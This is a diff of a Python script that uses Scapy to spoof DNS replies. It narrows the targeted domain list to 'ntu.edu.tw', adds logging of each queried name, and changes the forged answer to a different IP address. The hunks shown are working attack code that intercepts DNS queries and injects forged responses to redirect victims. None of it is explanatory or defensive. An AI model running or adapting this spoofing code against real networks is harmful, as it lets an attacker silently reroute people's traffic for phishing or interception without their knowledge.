@@ -1,7 +1,6 @@
 from scapy.all import *
 
 test_list = ['ntu.edu.tw',
-             'gov.tw'
                  ]
 
 redirect_ip = ''
@@ -20,10 +19,11 @@ def dns_spoof(pkt):
         dns_packet = pkt.getlayer(DNS)
         test_domain = dns_packet.fields['qd'].fields['qname'].decode()[:-1]
         # test_domain in test_list
+        print('->', test_domain)
         if banned_domain(test_domain):
             resp = IP(src=ip_packet.dst, dst=ip_packet.src)
             resp /= UDP(sport=udp_packet.dport, dport=udp_packet.sport)
-            resp /= DNS(id=dns_packet.id, qr=1, qd=dns_packet.qd, an=DNSRR(rrname=dns_packet.qd.qname, rdata='140.112.8.116'))
+            resp /= DNS(id=dns_packet.id, qr=1, qd=dns_packet.qd, an=DNSRR(rrname=dns_packet.qd.qname, rdata='172.217.163.46'))
             send(resp)
             print('[+] Spoof finished')
 
